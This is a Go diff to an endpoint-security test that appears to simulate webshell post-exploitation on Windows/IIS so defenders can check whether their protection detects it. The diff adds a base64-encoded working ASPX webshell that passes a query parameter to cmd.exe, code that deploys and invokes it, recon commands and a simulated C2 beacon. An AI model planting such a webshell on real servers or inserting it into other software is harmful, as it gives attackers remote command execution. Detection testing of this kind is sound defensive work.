@@ -12,6 +12,7 @@ COMPLEXITY: medium
 THREAT_ACTOR: N/A
 SUBCATEGORY: initial-access
 TAGS: webshell, cmd-execution, exploit-public-facing, post-exploitation
+SOURCE_URL: https://top-attack-techniques.mitre-engenuity.org/
 UNIT: response
 CREATED: 2026-01-11
 AUTHOR: sectest-builder
@@ -19,7 +20,8 @@ AUTHOR: sectest-builder
 package main
 
 import (
-	"errors"
+	"bytes"
+	"encoding/base64"
 	"fmt"
 	"io"
 	"net/http"
@@ -30,16 +32,40 @@ import (
 	"time"
 
 	"github.com/google/uuid"
-	Dropper "github.com/preludeorg/libraries/go/tests/dropper"
 	Endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
-	"golang.org/x/sys/windows"
 )
 
 const (
 	TEST_UUID  = "c5f1d6e9-4a0b-1f8c-5d2e-9b0c1d2e3f09"
 	TEST_NAME  = "Webshell Post-Exploitation Simulation"
 	TARGET_DIR = "c:\\F0"
+
+	// ExitTestError is the framework test-error exit code. The vendored prelude
+	// endpoint lib maps UnexpectedTestError to exit 1 — do not use it (CLAUDE.md).
+	ExitTestError = 999
 )
+
+// isAdminContext gates denial classification (Bug Prevention Rule 8).
+var isAdminContext = false
+
+// probeAdminContext checks whether the current context is elevated.
+func probeAdminContext() bool {
+	return exec.Command("net", "session").Run() == nil
+}
+
+// fileExists is a small os.Stat wrapper
+func fileExists(path string) bool {
+	_, err := os.Stat(path)
+	return err == nil
+}
+
+// isPositiveProtectionEvidence returns true ONLY for exact OS/policy denial
+// markers (generic words, PATH errors and localized variants are NOT evidence).
+func isPositiveProtectionEvidence(s string) bool {
+	return strings.Contains(s, "Access is denied") ||
+		strings.Contains(s, "This program is blocked by group policy") ||
+		strings.Contains(s, "Operation did not complete successfully because the file contains a virus")
+}
 
 // C2 test endpoint - harmless public service for connectivity verification
 const C2_ENDPOINT = "https://httpbin.org/post"
@@ -92,6 +118,39 @@ var reconCommands = []ReconCommand{
 	},
 }
 
+// webshellAspxB64 is a minimal textbook ASPX command-execution webshell,
+// base64-stored so the repo never carries a directly-usable webshell file
+// (decoded and written to the lab webroot only at runtime, deleted at cleanup).
+// Bit source: textbook Process.Start(cmd /c ?c=) executor — the exact shape
+// webshell detections key on (aspx drop + w3wp.exe spawning cmd.exe).
+const webshellAspxB64 = "PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiAlPgo8JUAgSW1wb3J0IE5hbWVzcGFjZT0iU3lzdGVtLkRpYWdub3N0aWNzIiAlPgo8JQogICAgc3RyaW5nIGMgPSBSZXF1ZXN0LlF1ZXJ5U3RyaW5nWyJjIl07CiAgICBpZiAoIXN0cmluZy5Jc051bGxPckVtcHR5KGMpKSB7CiAgICAgICAgdmFyIHAgPSBuZXcgUHJvY2Vzc1N0YXJ0SW5mbygiY21kLmV4ZSIsICIvYyAiICsgYyk7CiAgICAgICAgcC5SZWRpcmVjdFN0YW5kYXJkT3V0cHV0ID0gdHJ1ZTsgcC5Vc2VTaGVsbEV4ZWN1dGUgPSBmYWxzZTsKICAgICAgICB2YXIgcHJvYyA9IFByb2Nlc3MuU3RhcnQocCk7CiAgICAgICAgUmVzcG9uc2UuV3JpdGUoIjxwcmU+IiArIHByb2MuU3RhbmRhcmRPdXRwdXQuUmVhZFRvRW5kKCkgKyAiPC9wcmU+Iik7CiAgICB9CiU+Cg==" 
+
+// WEBROOT under ARTIFACT_DIR (non-whitelisted; all writes stay inside it)
+const WEBROOT_DIR = "c:\\Users\\fortika-test\\webroot"
+const WEBAPP_NAME = "F0"
+
+// webAppCreated tracks IIS app creation for cleanup
+var webAppCreated bool
+
+// runPowerShell runs a PowerShell command with MultiWriter capture; returns output+err
+func runPowerShell(psCmd string) (string, error) {
+	cmd := exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", psCmd)
+	var buf bytes.Buffer
+	cmd.Stdout = io.MultiWriter(os.Stdout, &buf)
+	cmd.Stderr = io.MultiWriter(os.Stderr, &buf)
+	err := cmd.Run()
+	pid := 0
+	if cmd.Process != nil {
+		pid = cmd.Process.Pid
+	}
+	exitCode := 0
+	if err != nil && cmd.ProcessState != nil {
+		exitCode = cmd.ProcessState.ExitCode()
+	}
+	LogProcessExecution("powershell.exe", "powershell -Command <webapp mgmt>", pid, err == nil, exitCode, "IIS web-app management")
+	return buf.String(), err
+}
+
 // CommandResult stores the result of a reconnaissance command
 type CommandResult struct {
 	Command  string
@@ -118,9 +177,14 @@ func executeReconCommand(rc ReconCommand) CommandResult {
 		cmd = exec.Command(rc.Command)
 	}
 
-	output, err := cmd.CombinedOutput()
+	// Tee output to console AND buffer; persist per-command output file
+	var outputBuffer bytes.Buffer
+	cmd.Stdout = io.MultiWriter(os.Stdout, &outputBuffer)
+	cmd.Stderr = io.MultiWriter(os.Stderr, &outputBuffer)
+
+	err := cmd.Run()
 	result.Duration = time.Since(startTime)
-	result.Output = string(output)
+	result.Output = outputBuffer.String()
 
 	pid := 0
 	exitCode := 0
@@ -128,30 +192,30 @@ func executeReconCommand(rc ReconCommand) CommandResult {
 		pid = cmd.Process.Pid
 	}
 
+	if len(result.Output) > 0 {
+		outputPath := filepath.Join(TARGET_DIR, fmt.Sprintf("%s_output.txt", rc.Name))
+		os.WriteFile(outputPath, []byte(result.Output), 0644)
+	}
+
+	cmdLine := strings.Join(append([]string{rc.Command}, rc.Args...), " ")
+
 	if err != nil {
 		result.Error = err.Error()
+		if exitErr, ok := err.(*exec.ExitError); ok {
+			exitCode = exitErr.ExitCode()
+		} else {
+			exitCode = 1
+		}
 
-		// Check for blocked/denied indicators
-		outputLower := strings.ToLower(result.Output)
-		errorLower := strings.ToLower(err.Error())
-
-		if strings.Contains(outputLower, "access denied") ||
-			strings.Contains(outputLower, "blocked") ||
-			strings.Contains(outputLower, "not recognized") ||
-			errors.Is(err, windows.ERROR_ACCESS_DENIED) || strings.Contains(errorLower, "access denied") ||
-			strings.Contains(errorLower, "blocked") {
+		// Block ONLY on exact OS denial, admin-gated (Rule 8). "not recognized"
+		// is a PATH/missing-binary environment error — benign.
+		if isAdminContext && (isPositiveProtectionEvidence(result.Output) || isPositiveProtectionEvidence(result.Error)) {
 			result.Blocked = true
 			result.ExitCode = 126
-			LogProcessExecution(rc.Command, strings.Join(append([]string{rc.Command}, rc.Args...), " "), pid, false, 126, "Blocked by security controls")
+			LogProcessExecution(rc.Command, cmdLine, pid, false, 126, "Blocked by security controls (OS denial)")
 		} else {
-			// Command failed but not necessarily blocked
-			if exitErr, ok := err.(*exec.ExitError); ok {
-				exitCode = exitErr.ExitCode()
-			} else {
-				exitCode = 1
-			}
 			result.ExitCode = exitCode
-			LogProcessExecution(rc.Command, strings.Join(append([]string{rc.Command}, rc.Args...), " "), pid, false, exitCode, err.Error())
+			LogProcessExecution(rc.Command, cmdLine, pid, false, exitCode, err.Error())
 		}
 		return result
 	}
@@ -159,7 +223,7 @@ func executeReconCommand(rc ReconCommand) CommandResult {
 	// Command succeeded
 	result.Success = true
 	result.ExitCode = 0
-	LogProcessExecution(rc.Command, strings.Join(append([]string{rc.Command}, rc.Args...), " "), pid, true, 0, "")
+	LogProcessExecution(rc.Command, cmdLine, pid, true, 0, "")
 
 	return result
 }
@@ -189,15 +253,10 @@ func performC2Callback(data string) (bool, bool, string) {
 	duration := time.Since(startTime)
 
 	if err != nil {
-		// Check if blocked by network security
+		// Network errors (DNS failure, refused connections, timeouts) are
+		// environmental conditions, NOT endpoint protection evidence (Rule 8).
 		errorStr := err.Error()
-		if strings.Contains(errorStr, "blocked") ||
-			strings.Contains(errorStr, "forbidden") ||
-			strings.Contains(errorStr, "connection refused") {
-			LogMessage("INFO", "C2 Callback", fmt.Sprintf("C2 callback blocked: %s (%v)", errorStr, duration))
-			return false, true, fmt.Sprintf("Blocked: %v", err)
-		}
-		LogMessage("ERROR", "C2 Callback", fmt.Sprintf("C2 callback failed: %s (%v)", errorStr, duration))
+		LogMessage("WARN", "C2 Callback", fmt.Sprintf("C2 callback network failure (benign, not protection evidence): %s (%v)", errorStr, duration))
 		return false, false, fmt.Sprintf("Network error: %v", err)
 	}
 	defer resp.Body.Close()
@@ -210,13 +269,96 @@ func performC2Callback(data string) (bool, bool, string) {
 		return true, false, fmt.Sprintf("HTTP %d - %d bytes received", resp.StatusCode, len(body))
 	}
 
-	// Non-success status codes
+	// Non-success status codes are the REMOTE service's response (httpbin),
+	// not endpoint protection — never classified as blocked (Rule 8).
 	if resp.StatusCode == 403 || resp.StatusCode == 451 {
-		LogMessage("INFO", "C2 Callback", fmt.Sprintf("C2 callback blocked by proxy/firewall: HTTP %d", resp.StatusCode))
-		return false, true, fmt.Sprintf("Blocked: HTTP %d", resp.StatusCode)
+		LogMessage("WARN", "C2 Callback", fmt.Sprintf("Remote endpoint returned HTTP %d (remote-service response, not endpoint protection)", resp.StatusCode))
+	}
+	return false, false, fmt.Sprintf("HTTP %d", resp.StatusCode)
+}
+
+// executeWebshellPhase drops a runtime-generated ASPX webshell into an IIS web
+// application rooted at WEBROOT_DIR (inside ARTIFACT_DIR — no writes outside
+// it) and invokes it over LOOPBACK, producing the defining webshell lineage:
+// w3wp.exe spawning cmd.exe. The ASPX payload is decoded from base64 at
+// runtime and deleted at cleanup; the repo never carries a usable webshell.
+// Returns: success, blocked, msg
+func executeWebshellPhase() (bool, bool, string) {
+	Endpoint.Say("  Webshell phase: IIS drop + loopback invocation (w3wp.exe lineage)")
+
+	// Prerequisite: W3SVC running
+	out, err := runPowerShell("(Get-Service W3SVC).Status")
+	if err != nil || !strings.Contains(out, "Running") {
+		LogMessage("WARN", "Webshell", "IIS (W3SVC) not running — skipping webshell phase (prerequisite)")
+		return false, false, "IIS not available — skipped"
 	}
 
-	return false, false, fmt.Sprintf("HTTP %d", resp.StatusCode)
+	// Create webroot + web application rooted in ARTIFACT_DIR
+	if err := os.MkdirAll(WEBROOT_DIR, 0755); err != nil {
+		return false, false, fmt.Sprintf("webroot mkdir failed: %v", err)
+	}
+	if _, err := runPowerShell(fmt.Sprintf(
+		"Import-Module WebAdministration; New-WebApplication -Name '%s' -Site 'Default Web Site' -PhysicalPath '%s' -Force", WEBAPP_NAME, WEBROOT_DIR)); err != nil {
+		LogMessage("WARN", "Webshell", fmt.Sprintf("New-WebApplication failed (benign skip): %v", err))
+		return false, false, fmt.Sprintf("web app creation failed: %v", err)
+	}
+	webAppCreated = true
+	LogMessage("INFO", "Webshell", fmt.Sprintf("Created IIS web application /%s -> %s", WEBAPP_NAME, WEBROOT_DIR))
+
+	// Drop the runtime-decoded ASPX webshell
+	aspx, err := base64.StdEncoding.DecodeString(webshellAspxB64)
+	if err != nil || len(aspx) < 50 {
+		return false, false, "webshell decode failed (internal)"
+	}
+	shellName := fmt.Sprintf("svc-%d.aspx", time.Now().Unix())
+	shellPath := filepath.Join(WEBROOT_DIR, shellName)
+	if err := os.WriteFile(shellPath, aspx, 0644); err != nil {
+		if strings.Contains(err.Error(), "Access is denied") {
+			return false, true, "webshell write denied (OS denial)"
+		}
+		return false, false, fmt.Sprintf("webshell write failed: %v", err)
+	}
+	LogFileDropped(shellName, shellPath, int64(len(aspx)), false)
+	LogMessage("INFO", "Webshell", fmt.Sprintf("Dropped runtime-generated ASPX webshell: %s (%d bytes)", shellPath, len(aspx)))
+
+	// Quarantine check: EDRs often delete dropped webshells
+	Endpoint.Wait(3)
+	if !fileExists(shellPath) {
+		LogFileDropped(shellName, shellPath, int64(len(aspx)), true)
+		LogMessage("INFO", "Webshell", "Webshell file disappeared (os.Stat-confirmed quarantine)")
+		return false, true, "webshell quarantined on drop"
+	}
+
+	// Invoke over LOOPBACK — this is the lineage signal: w3wp.exe -> cmd.exe
+	url := fmt.Sprintf("http://localhost/%s/%s?c=whoami", WEBAPP_NAME, shellName)
+	client := &http.Client{Timeout: 30 * time.Second}
+	startTime := time.Now()
+	resp, err := client.Get(url)
+	duration := time.Since(startTime)
+	if err != nil {
+		// Web-server errors are environmental, not endpoint protection (Rule 8)
+		LogMessage("WARN", "Webshell", fmt.Sprintf("Loopback invocation failed (benign): %v (%v)", err, duration))
+		return false, false, fmt.Sprintf("invocation failed: %v", err)
+	}
+	defer resp.Body.Close()
+	body, _ := io.ReadAll(resp.Body)
+	bodyStr := string(body)
+
+	if resp.StatusCode == 403 || resp.StatusCode == 404 {
+		// Remote-service response (IIS request filtering), not endpoint protection
+		LogMessage("WARN", "Webshell", fmt.Sprintf("IIS returned HTTP %d for the webshell (server-side filtering; logged, not counted)", resp.StatusCode))
+		return false, false, fmt.Sprintf("IIS HTTP %d", resp.StatusCode)
+	}
+
+	// Success = the webshell executed whoami under w3wp.exe (output looks like
+	// "computer\user" wrapped in <pre>)
+	if strings.Contains(bodyStr, "<pre>") && strings.Contains(bodyStr, `\`) {
+		LogMessage("INFO", "Webshell", fmt.Sprintf("Webshell executed under w3wp.exe lineage (HTTP %d, %d bytes, %v)", resp.StatusCode, len(body), duration))
+		return true, false, "webshell executed via IIS (w3wp.exe -> cmd.exe)"
+	}
+
+	LogMessage("WARN", "Webshell", fmt.Sprintf("Webshell responded HTTP %d but output not recognized (%d bytes)", resp.StatusCode, len(body)))
+	return false, false, "webshell response unrecognized"
 }
 
 // writeReconOutput saves all reconnaissance output to a marker file
@@ -264,6 +406,12 @@ func cleanup() {
 	files := []string{
 		"webshell_recon_output.txt",
 		"test_summary.txt",
+		"whoami_output.txt",
+		"hostname_output.txt",
+		"ipconfig_output.txt",
+		"systeminfo_output.txt",
+		"netstat_output.txt",
+		"tasklist_output.txt",
 	}
 
 	for _, file := range files {
@@ -272,6 +420,15 @@ func cleanup() {
 			LogMessage("INFO", "Cleanup", fmt.Sprintf("Removed: %s", file))
 		}
 	}
+
+	// Remove the IIS web application, any dropped webshells, and the webroot
+	if webAppCreated {
+		runPowerShell(fmt.Sprintf("Import-Module WebAdministration; Remove-WebApplication -Name '%s' -Site 'Default Web Site'", WEBAPP_NAME))
+		webAppCreated = false
+		LogMessage("INFO", "Cleanup", "Removed IIS web application /"+WEBAPP_NAME)
+	}
+	os.RemoveAll(WEBROOT_DIR)
+	LogMessage("INFO", "Cleanup", "Removed webroot "+WEBROOT_DIR)
 }
 
 func test() {
@@ -280,8 +437,10 @@ func test() {
 		if r := recover(); r != nil {
 			if globalLog != nil {
 				LogMessage("CRITICAL", "Runtime", fmt.Sprintf("Panic recovered: %v", r))
-				SaveLog(Endpoint.UnexpectedTestError, fmt.Sprintf("Panic: %v", r))
+				SaveLog(ExitTestError, fmt.Sprintf("Panic: %v", r))
 			}
+			cleanup()
+			Endpoint.Stop(ExitTestError)
 		}
 	}()
 
@@ -296,19 +455,23 @@ func test() {
 	LogPhaseStart(1, "Initialization")
 	Endpoint.Say("Phase 1: Initializing test environment")
 
-	if err := Endpoint.Dropper(Dropper.Dropper); err != nil {
-		LogPhaseError(0, fmt.Sprintf("Dropper initialization failed: %v", err))
-		LogPhaseEnd(0, "failed", "Dropper initialization failed")
-		SaveLog(Endpoint.UnexpectedTestError, "Dropper initialization failed")
-		Endpoint.Stop(Endpoint.UnexpectedTestError)
-	}
+	// NOTE: Endpoint.Dropper call removed — it dropped an unused binary into CWD
+	// on every run and was never executed (audit 2026-11-03).
 
 	// Create target directory
 	if err := os.MkdirAll(TARGET_DIR, 0755); err != nil {
 		LogPhaseError(0, fmt.Sprintf("Failed to create target directory: %v", err))
 		LogPhaseEnd(0, "failed", "Failed to create target directory")
-		SaveLog(Endpoint.UnexpectedTestError, "Failed to create target directory")
-		Endpoint.Stop(Endpoint.UnexpectedTestError)
+		SaveLog(ExitTestError, "Failed to create target directory")
+		Endpoint.Stop(ExitTestError)
+	}
+
+	// Probe privilege context once — gates denial classification (Rule 8)
+	isAdminContext = probeAdminContext()
+	if isAdminContext {
+		LogMessage("INFO", "Initialization", "Running elevated (administrator)")
+	} else {
+		LogMessage("WARN", "Initialization", "Running NON-elevated — access-denied outcomes will be treated as benign environment results")
 	}
 
 	LogMessage("INFO", "Initialization", "Test environment ready")
@@ -349,8 +512,26 @@ func test() {
 		LogPhaseEnd(1, "partial", fmt.Sprintf("%d/%d commands succeeded", successCount, len(reconCommands)))
 	}
 
+	// Phase 2b: Webshell Execution via IIS (w3wp.exe lineage)
+	LogPhaseStart(3, "Webshell Execution via IIS")
+	Endpoint.Say("\nPhase 2b: Webshell drop + loopback invocation (IIS)")
+
+	wsSuccess, wsBlocked, wsMsg := executeWebshellPhase()
+	if wsBlocked {
+		Endpoint.Say("  [BLOCKED] Webshell phase blocked (positive evidence)")
+		blockedCount++
+		LogPhaseEnd(2, "blocked", wsMsg)
+	} else if wsSuccess {
+		Endpoint.Say("  [VULNERABLE] Webshell executed via IIS (w3wp.exe -> cmd.exe lineage)")
+		successCount++
+		LogPhaseEnd(2, "success", wsMsg)
+	} else {
+		Endpoint.Say("  [INFO] Webshell phase skipped/inconclusive: %s", wsMsg)
+		LogPhaseEnd(2, "skipped", wsMsg)
+	}
+
 	// Phase 3: C2 Callback Simulation
-	LogPhaseStart(3, "C2 Callback Simulation")
+	LogPhaseStart(4, "C2 Callback Simulation")
 	Endpoint.Say("\nPhase 3: Simulating C2 callback (webshell beacon)")
 	Endpoint.Say("  Target: %s (harmless test endpoint)", C2_ENDPOINT)
 
@@ -366,14 +547,14 @@ func test() {
 
 	if c2Blocked {
 		Endpoint.Say("  [BLOCKED] C2 callback was blocked by network security")
-		LogPhaseEnd(2, "blocked", "C2 callback blocked by network security")
+		LogPhaseEnd(3, "blocked", "C2 callback blocked by network security")
 	} else if c2Success {
 		Endpoint.Say("  [VULNERABLE] C2 callback completed successfully")
-		LogPhaseEnd(2, "success", "C2 callback succeeded - outbound connection allowed")
+		LogPhaseEnd(3, "success", "C2 callback succeeded - outbound connection allowed")
 	} else {
 		// Network unavailable - not necessarily protected, could be environmental
 		Endpoint.Say("  [ERROR] C2 callback failed: %s", c2Error)
-		LogPhaseEnd(2, "failed", fmt.Sprintf("C2 callback failed: %s", c2Error))
+		LogPhaseEnd(3, "failed", fmt.Sprintf("C2 callback failed: %s", c2Error))
 	}
 
 	// Phase 4: Write Output and Assessment
@@ -457,9 +638,9 @@ Assessment:
 		// C2 failed but not blocked, some commands failed - network issue
 		Endpoint.Say("\n[RESULT] INCONCLUSIVE - Network issues prevented full test")
 		LogMessage("WARN", "Final Assessment", "Test inconclusive due to network/environmental issues")
-		SaveLog(999, "Network unavailable for C2 callback")
+		SaveLog(ExitTestError, "Network unavailable for C2 callback")
 		cleanup()
-		Endpoint.Stop(999) // Exit 999 - network unavailable
+		Endpoint.Stop(ExitTestError) // Exit 999 - network unavailable
 	} else if successCount > 0 || c2Success {
 		// Some or all commands succeeded and C2 worked - unprotected
 		Endpoint.Say("\n[RESULT] UNPROTECTED - Webshell reconnaissance and C2 activity succeeded")
@@ -471,9 +652,9 @@ Assessment:
 		// Edge case
 		Endpoint.Say("\n[RESULT] INCONCLUSIVE - Unable to determine protection status")
 		LogMessage("WARN", "Final Assessment", "Test inconclusive")
-		SaveLog(Endpoint.UnexpectedTestError, "Test inconclusive")
+		SaveLog(ExitTestError, "Test inconclusive")
 		cleanup()
-		Endpoint.Stop(Endpoint.UnexpectedTestError)
+		Endpoint.Stop(ExitTestError)
 	}
 }
 
@@ -512,15 +693,11 @@ func main() {
 		Severity:      "high",
 		Techniques:    []string{"T1190", "T1059.003"},
 		Tactics:       []string{"initial-access", "execution"},
-		Score:         7.5,
-		RubricVersion: "v1",
-		ScoreBreakdown: &ScoreBreakdown{
-			RealWorldAccuracy:       2.5, // Authentic webshell recon patterns
-			TechnicalSophistication: 2.0, // Multiple recon commands + C2
-			SafetyMechanisms:        1.5, // Read-only commands, safe C2 endpoint
-			DetectionOpportunities:  1.0, // 6+ recon commands + C2 = many detection points
-			LoggingObservability:    0.5, // Full Schema v2.0 logging
-		},
+		Score:         7.7, // v2.1 — lab-verified 2026-11-03 on the win lab (Sophos Intercept X). See info.md v2.1 scorecard.
+		RubricVersion: "v2.1",
+		// ScoreBreakdown intentionally nil under v2.1 — the v1 dimensions in
+		// the struct do not match the v2.1 tiered structure. The v2.1 breakdown
+		// lives in the info.md scorecard table.
 		Tags: []string{"webshell", "post-exploitation", "reconnaissance", "c2", "native"},
 	}
 
@@ -559,6 +736,7 @@ func main() {
 			LogMessage("ERROR", "Timeout", fmt.Sprintf("Test exceeded timeout of %v", timeout))
 			SaveLog(Endpoint.TimeoutExceeded, fmt.Sprintf("Test exceeded timeout of %v", timeout))
 		}
+		cleanup()
 		Endpoint.Stop(Endpoint.TimeoutExceeded)
 	}
 }
